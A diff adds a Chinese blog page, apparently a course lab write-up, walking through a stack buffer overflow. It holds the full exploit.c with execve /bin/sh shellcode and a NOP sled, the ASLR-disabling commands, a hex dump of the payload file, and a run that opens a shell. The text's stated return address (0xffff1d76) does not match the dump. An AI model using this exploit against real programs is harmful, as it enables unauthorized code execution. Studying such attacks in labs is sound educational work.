@@ -1,0 +1,691 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.0.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="Buffer Overflow Attack ，part2：模拟实验">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Buffer Overflow Attack ，part2：模拟实验">
+<meta property="og:url" content="http://example.com/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/index.html">
+<meta property="og:site_name" content="FireKnight-HJ">
+<meta property="og:description" content="Buffer Overflow Attack ，part2：模拟实验">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649411082559-16494111375821-16497336117841.png">
+<meta property="og:image" content="http://example.com/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649414928010-16497336117842.png">
+<meta property="og:image" content="http://example.com/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649695767349-16497336117853.png">
+<meta property="og:image" content="http://example.com/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649695798228-16497336117854.png">
+<meta property="og:image" content="http://example.com/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649695847388-16497336117855.png">
+<meta property="og:image" content="http://example.com/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649695888297-16497336117856.png">
+<meta property="og:image" content="http://example.com/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649732930514.png">
+<meta property="og:image" content="http://example.com/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649732962431.png">
+<meta property="og:image" content="http://example.com/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649732973365.png">
+<meta property="og:image" content="http://example.com/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649695859172-16497336117857.png">
+<meta property="og:image" content="http://example.com/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649695866837-16497336117858.png">
+<meta property="article:published_time" content="2022-04-11T17:10:53.000Z">
+<meta property="article:modified_time" content="2022-04-12T03:25:15.756Z">
+<meta property="article:author" content="fireknight">
+<meta property="article:tag" content="Buffer Overflow Attack">
+<meta property="article:tag" content="C语言">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649411082559-16494111375821-16497336117841.png">
+
+<link rel="canonical" href="http://example.com/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Buffer Overflow Attack ，part2：模拟实验 | FireKnight-HJ</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="FireKnight-HJ" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">FireKnight-HJ</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+  <a href="https://github.com/fireknight-hJ" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="fireknight">
+      <meta itemprop="description" content="fireknight-hJ的博客">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="FireKnight-HJ">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Buffer Overflow Attack ，part2：模拟实验
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-04-12 01:10:53 / 修改时间：11:25:15" itemprop="dateCreated datePublished" datetime="2022-04-12T01:10:53+08:00">2022-04-12</time>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>24k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>22 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>Buffer Overflow Attack ，part2：模拟实验</p>
+<span id="more"></span>
+<h3 id="1-实验步骤："><a href="#1-实验步骤：" class="headerlink" title="1. 实验步骤："></a>1. 实验步骤：</h3><h4 id="1-1-运行-exploit-程序，生成-badfile"><a href="#1-1-运行-exploit-程序，生成-badfile" class="headerlink" title="1.1 运行 exploit 程序，生成 badfile"></a>1.1 运行 exploit 程序，生成 badfile</h4><p>按照 如下命令行，运行 exploit 程序，生成 badfile。利用 xxd 分析 badfile，同时分析 exploit.c 源代码，理解并解释为什么程序能够生成 badfile 的内容。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. make</span><br><span class="line">2. setarch i386 -R ./exploit</span><br><span class="line">   (generate &quot;badfile&quot; while ASLR disabled)</span><br><span class="line">3. xxd badfile</span><br><span class="line">   (to observe the content of &quot;badfile&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">(tested on Ubuntu 18.04 64bit, gcc 7.5.0)</span><br></pre></td></tr></table></figure>
+<p>执行<code>xxd badfile</code>后输出结果如下：</p>
+<p><img src="/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649411082559-16494111375821-16497336117841.png" alt="uTools_1649411082559"></p>
+<h4 id="1-2-运行-stack-程序，实施栈溢出利用，观察-shellcode-的执行效果"><a href="#1-2-运行-stack-程序，实施栈溢出利用，观察-shellcode-的执行效果" class="headerlink" title="1.2 运行 stack 程序，实施栈溢出利用，观察 shellcode 的执行效果"></a>1.2 运行 stack 程序，实施栈溢出利用，观察 shellcode 的执行效果</h4><p>执行如下命令<code>-R</code>代表禁止使用地址随机化（这种编译器措施可以一定程度上防范缓冲区溢出攻击），这是我们程序能够顺利进行的必要条件。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4. setarch i386 -R ./stack</span><br><span class="line">   (shell code injected onto the stack and executed)</span><br></pre></td></tr></table></figure>
+<p>运行<code>setarch i386 -R ./stack</code>命令，得到结果如下：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ setarch i386 -R ./stack</span><br><span class="line">str addr (0xffffcfd7)</span><br><span class="line">buffer addr (0xffffcf98)</span><br><span class="line">$</span><br><span class="line">$ </span><br></pre></td></tr></table></figure>
+<p>运行截图：</p>
+<p><img src="/2022/04/12/Buffer-Overflow-Attack-%EF%BC%8Cpart2%EF%BC%9A%E6%A8%A1%E6%8B%9F%E5%AE%9E%E9%AA%8C/uTools_1649414928010-16497336117842.png" alt="uTools_1649414928010"></p>
+<p>我们发现我们通过运行stack这个程序成功进入到了shell中，我们的攻击成功了。</p>
+<h3 id="2-攻击执行过程详解"><a href="#2-攻击执行过程详解" class="headerlink" title="2. 攻击执行过程详解"></a>2. 攻击执行过程详解</h3><h4 id="2-1-badfile生成"><a href="#2-1-badfile生成" class="headerlink" title="2.1 badfile生成"></a>2.1 badfile生成</h4><p>exploit.c程序代码及详解如下：</p>
+<ul>
+<li>shellcode[]数组中存储了我们利用buffer overflow漏洞想要执行的恶意代码</li>
+<li>fillBuffer函数将shellcode[]数组中的恶意代码放在了函数fillBuffer的最后并在buffer[BUFFER_SIZE-1] 处填入 ‘\0’，并将buffer[]数组中前25*4个字节的内容填充满了<em>我们想要让程序跳转到的恶意代码所在的目标位置的内存地址</em>，这个位置可以是任何一个NOP所在位置，或者恶意程序开头所在位置。</li>
+<li>main()函数中，首先将buffer[Buffer_Size]数组中填满NOP（0x90），之后调用fillBuffer(buffer)函数将恶意代码和跳转地址填入，最后将buffer[]数组的内容写入badfile中。</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* exploit.c */</span></span><br><span class="line"><span class="comment">/* A program that creates a file &quot;badfile&quot; containing code for launching shell */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> BUFFER_SIZE 517 <span class="comment">// Represent the size of the buffer</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OFFSET 400 <span class="comment">// Represent the offset from buffer</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//shellcode[]数组中存储了我们利用buffer overflow漏洞想要执行的恶意代码</span></span><br><span class="line"><span class="keyword">char</span> shellcode[] =</span><br><span class="line">  <span class="string">&quot;\x31\xc0&quot;</span></span><br><span class="line">  <span class="string">&quot;\x50&quot;</span></span><br><span class="line">  <span class="string">&quot;\x68&quot;</span><span class="string">&quot;//sh&quot;</span></span><br><span class="line">  <span class="string">&quot;\x68&quot;</span><span class="string">&quot;/bin&quot;</span></span><br><span class="line">  <span class="string">&quot;\x89\xe3&quot;</span></span><br><span class="line">  <span class="string">&quot;\x50&quot;</span></span><br><span class="line">  <span class="string">&quot;\x53&quot;</span></span><br><span class="line">  <span class="string">&quot;\x89\xe1&quot;</span></span><br><span class="line">  <span class="string">&quot;\x99&quot;</span></span><br><span class="line">  <span class="string">&quot;\xb0\x0b&quot;</span></span><br><span class="line">  <span class="string">&quot;\xcd\x80&quot;</span></span><br><span class="line">;</span><br><span class="line"><span class="comment">//fillBuffer函数将shellcode[]数组中的恶意代码放在了函数fillBuffer的最后</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">fillBuffer</span><span class="params">(<span class="keyword">char</span> buffer[BUFFER_SIZE])</span> </span>&#123;</span><br><span class="line">  <span class="comment">// Get the size of the shellcode</span></span><br><span class="line">  <span class="keyword">int</span> shellcodeSize = <span class="keyword">sizeof</span>(shellcode);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Represent an estimate return address that will eventually allow shellcode to be executed</span></span><br><span class="line">  <span class="comment">// by using the address of the buffer and an offset value (400 bytes after the buffer in this case)</span></span><br><span class="line">  <span class="keyword">long</span> *returnAddress = (<span class="keyword">long</span> *) (buffer+OFFSET);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Get a long integer pointer of the buffer to reference each 4-bytes hexadecimal in a stack memory address</span></span><br><span class="line">  <span class="keyword">long</span> *bufferPtr = (<span class="keyword">long</span> *) buffer;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Represent index for the &quot;for&quot; loop</span></span><br><span class="line">  <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Get the starting index of the null-terminated shellcode in the buffer</span></span><br><span class="line">  <span class="comment">// (i.e. null-terminated shellcode is inserted at the end of the buffer)</span></span><br><span class="line">  <span class="keyword">int</span> shellcodeStartIndex = (BUFFER_SIZE-(shellcodeSize+<span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Represent counter for the shellcode</span></span><br><span class="line">  <span class="keyword">int</span> shellcodeCounter = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Loop 25 times (each time modifying the 4-bytes hexadecimal in the stack memory address starting from the buffer)</span></span><br><span class="line">  <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">25</span>; i++) &#123;</span><br><span class="line">    *bufferPtr = (<span class="keyword">long</span>) returnAddress; <span class="comment">// Assign the estimate return address to a 4-bytes hexadecimal in the stack memory address</span></span><br><span class="line">    bufferPtr++; <span class="comment">// Go to the next 4-bytes hexadecimal in the stack memory address (because long integer is 4-bytes portion)</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Insert shellcode (without null-termination) at the end of the buffer</span></span><br><span class="line">  <span class="keyword">for</span> (i = shellcodeStartIndex; i &lt; (BUFFER_SIZE<span class="number">-1</span>); i++) &#123;</span><br><span class="line">    buffer[i] = shellcode[shellcodeCounter];</span><br><span class="line">    shellcodeCounter++;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Null-terminate the shellcode</span></span><br><span class="line">  buffer[BUFFER_SIZE<span class="number">-1</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buffer[BUFFER_SIZE];</span><br><span class="line"><span class="comment">//	printf(&quot;buffer addr (%p)\n&quot;, buffer);</span></span><br><span class="line">  FILE *badfile;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Initialize buffer with 0x90 (NOP instruction) */</span></span><br><span class="line">  <span class="built_in">memset</span>(&amp;buffer, <span class="number">0x90</span>, BUFFER_SIZE);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* You need to fill the buffer with appropriate contents here */</span></span><br><span class="line">  fillBuffer(buffer);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Save the contents to the file &quot;badfile&quot; */</span></span><br><span class="line">  badfile = fopen(<span class="string">&quot;./badfile&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line">  fwrite(buffer, BUFFER_SIZE, <span class="number">1</span>, badfile);</span><br><span class="line">  fclose(badfile);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>我们观察生成的badfile结构：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">lyq@lyq-virtual-machine:~/Desktop/hw1_cp$ xxd badfile</span><br><span class="line">00000000: 67d1 ffff 67d1 ffff 67d1 ffff 67d1 ffff  g...g...g...g...</span><br><span class="line">00000010: 67d1 ffff 67d1 ffff 67d1 ffff 67d1 ffff  g...g...g...g...</span><br><span class="line">00000020: 67d1 ffff 67d1 ffff 67d1 ffff 67d1 ffff  g...g...g...g...</span><br><span class="line">00000030: 67d1 ffff 67d1 ffff 67d1 ffff 67d1 ffff  g...g...g...g...</span><br><span class="line">00000040: 67d1 ffff 67d1 ffff 67d1 ffff 67d1 ffff  g...g...g...g...</span><br><span class="line">00000050: 67d1 ffff 67d1 ffff 67d1 ffff 67d1 ffff  g...g...g...g...</span><br><span class="line">00000060: 67d1 ffff 9090 9090 9090 9090 9090 9090  g...............</span><br><span class="line">00000070: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000080: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000090: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000a0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000b0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000c0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000d0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000e0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000000f0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000100: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000110: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000120: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000130: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000140: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000150: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000160: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000170: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000180: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">00000190: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000001a0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000001b0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000001c0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000001d0: 9090 9090 9090 9090 9090 9090 9090 9090  ................</span><br><span class="line">000001e0: 9090 9090 9090 9090 9090 9031 c050 682f  ...........1.Ph/</span><br><span class="line">000001f0: 2f73 6868 2f62 696e 89e3 5053 89e1 99b0  /shh/bin..PS....</span><br><span class="line">00000200: 0bcd 8000 00                             .....</span><br></pre></td></tr></table></figure>
+<p>可以看到：</p>
+<ul>
+<li>badfile的最前面是25个四字节数字：0xffff1d76，这个数字代表我们要覆盖return address的恶意代码地址（或NOP地址）设计填充多个0xffff1d76是为了提高覆盖return address位置的命中率</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000: 67d1 ffff 67d1 ffff 67d1 ffff 67d1 ffff  g...g...g...g...</span><br><span class="line">00000010: 67d1 ffff 67d1 ffff 67d1 ffff 67d1 ffff  g...g...g...g...</span><br><span class="line">00000020: 67d1 ffff 67d1 ffff 67d1 ffff 67d1 ffff  g...g...g...g...</span><br><span class="line">00000030: 67d1 ffff 67d1 ffff 67d1 ffff 67d1 ffff  g...g...g...g...</span><br><span class="line">00000040: 67d1 ffff 67d1 ffff 67d1 ffff 67d1 ffff  g...g...g...g...</span><br><span class="line">00000050: 67d1 ffff 67d1 ffff 67d1 ffff 67d1 ffff  g...g...g...g...</span><br><span class="line">00000060: 67d1 ffff 9090 9090 9090 9090 9090 9090  g...............</span><br></pre></td></tr></table></figure>
+<ul>
+<li>在badfile的最后部分是恶意代码和一个’0x0000‘代表’\0’结束符。</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">000001e0: 9090 9090 9090 9090 9090 9031 c050 682f  ...........1.Ph/</span><br><span class="line">000001f0: 2f73 6868 2f62 696e 89e3 5053 89e1 99b0  /shh/bin..PS....</span><br><span class="line">00000200: 0bcd 8000 00                             .....</span><br></pre></td></tr></table></figure>
+<ul>
+<li>而中间的内容中填充满了NOP(0x90)，中间设计填充NOP的作用也是为了提高程序跳转到恶意代码的成功率，只要程序可以跳转到任何一个NOP所在位置，或者跳转到恶意程序开始位置，程序都可以执行到我们植入的恶意代码部分。</li>
+</ul>
